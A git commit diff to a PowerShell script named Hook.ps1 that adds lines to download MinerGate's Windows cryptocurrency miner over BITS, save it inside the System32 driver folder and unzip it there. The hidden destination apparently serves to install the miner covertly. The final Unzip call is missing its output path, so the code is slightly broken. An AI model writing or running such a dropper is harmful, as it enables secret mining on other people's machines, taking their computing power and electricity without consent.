3ef3fd320ff0336c85481fcc36146d0a7859e649
diggles9991 <diggles9991@gmail.com>
2017-07-13 22:00:28 +1000

    Update Hook.ps1

--- Hook.ps1
+++ Hook.ps1
@@ -2,4 +2,13 @@
 $url2 = "https://minergate.com/download/win"
 $output2 = "C:\Windows\System32\drivers\en-US\MG.zip"
 Import-Module BitsTransfer
+Start-BitsTransfer -Source $url2 -Destination $output2
 
+#Extract
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+function Unzip
+{
+    param([string]$zipfile, [string]$outpath)
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
+}
+Unzip $output2
